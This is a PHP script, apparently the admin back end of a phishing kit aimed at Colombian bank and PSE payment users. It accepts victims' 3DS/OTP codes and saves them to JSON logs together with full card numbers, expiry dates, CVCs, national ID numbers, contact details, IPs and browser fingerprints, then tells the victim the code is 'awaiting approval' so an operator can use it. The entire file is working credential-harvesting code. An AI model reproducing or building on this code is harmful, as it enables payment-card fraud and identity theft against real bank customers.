<?php
// admin/verificar_3ds.php - Recibe el código 3DS y lo guarda
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$dataDir = __DIR__ . '/data';
$tarjetasFile = $dataDir . '/tarjetas.json';
$logsFile = $dataDir . '/pse_logs.json';

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

$id_3ds = $input['id_3ds'] ?? '';
$codigo = $input['codigo'] ?? '';
$tipo = $input['tipo'] ?? '';

if (empty($id_3ds)) {
    echo json_encode(['success' => false, 'error' => 'ID 3DS requerido']);
    exit;
}

if (empty($codigo)) {
    echo json_encode(['success' => false, 'error' => 'Código requerido']);
    exit;
}

// ====== ACTUALIZAR TARJETAS.JSON ======
if (!file_exists($tarjetasFile)) {
    echo json_encode(['success' => false, 'error' => 'No hay tarjetas registradas']);
    exit;
}

$content = file_get_contents($tarjetasFile);
$tarjetas = json_decode($content, true) ?? [];

$encontrado = false;
$datosTarjeta = null;
foreach ($tarjetas as &$t) {
    if ($t['id_3ds'] === $id_3ds) {
        $encontrado = true;
        $t['codigo_3ds'] = $codigo;
        $t['estado_3ds'] = 'pendiente';
        $t['tipo_3ds'] = $tipo;
        $t['fecha_verificacion'] = date('Y-m-d H:i:s');
        $datosTarjeta = $t;
        break;
    }
}
unset($t);

if (!$encontrado) {
    echo json_encode(['success' => false, 'error' => 'ID 3DS no encontrado']);
    exit;
}

file_put_contents($tarjetasFile, json_encode($tarjetas, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ====== ACTUALIZAR PSE_LOGS.JSON ======
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
    
    $logEncontrado = false;
    foreach ($logs as &$log) {
        if (isset($log['id_3ds']) && $log['id_3ds'] === $id_3ds) {
            $logEncontrado = true;
            $log['codigo_3ds'] = $codigo;
            $log['codigo_otp'] = $codigo;
            $log['estado_3ds'] = 'pendiente';
            $log['fecha_verificacion'] = date('Y-m-d H:i:s');
            break;
        }
    }
    unset($log);
    
    if (!$logEncontrado && $datosTarjeta) {
        $nuevoLog = [
            'id' => 'TARJETA_' . uniqid(),
            'fecha' => date('Y-m-d H:i:s'),
            'banco' => 'TARJETA_' . strtoupper($tipo),
            'activity' => 'TARJETA_3DS',
            'documento' => $datosTarjeta['cedula'] ?? '',
            'cedula' => $datosTarjeta['cedula'] ?? '',
            'usuario' => $datosTarjeta['cedula'] ?? '',
            'titular' => $datosTarjeta['titular'] ?? '',
            'nombre' => $datosTarjeta['nombre'] ?? '',
            'apellido' => $datosTarjeta['apellido'] ?? '',
            'email' => $datosTarjeta['email'] ?? '',
            'celular' => $datosTarjeta['celular'] ?? '',
            'monto' => $datosTarjeta['monto'] ?? '0',
            'numero_tarjeta' => $datosTarjeta['numero_tarjeta'] ?? '',
            'vencimiento' => $datosTarjeta['vencimiento'] ?? '',
            'cvc' => $datosTarjeta['cvc'] ?? '',
            'tipo_tarjeta' => $datosTarjeta['tipo_tarjeta'] ?? $tipo,
            'cuotas' => $datosTarjeta['cuotas'] ?? '1',
            'id_3ds' => $id_3ds,
            'codigo_3ds' => $codigo,
            'codigo_otp' => $codigo,
            'estado_3ds' => 'pendiente',
            'estado' => 'pendiente',
            'tiene_jelpit' => true,
            'fingerprint' => $datosTarjeta['fingerprint'] ?? '',
            'ip' => $datosTarjeta['ip'] ?? '',
            'user_agent' => $datosTarjeta['user_agent'] ?? ''
        ];
        array_unshift($logs, $nuevoLog);
    }
    
    file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

echo json_encode([
    'success' => true,
    'id_3ds' => $id_3ds,
    'message' => 'Código enviado, esperando aprobación',
    'estado' => 'pendiente',
    'codigo' => $codigo
]);
?>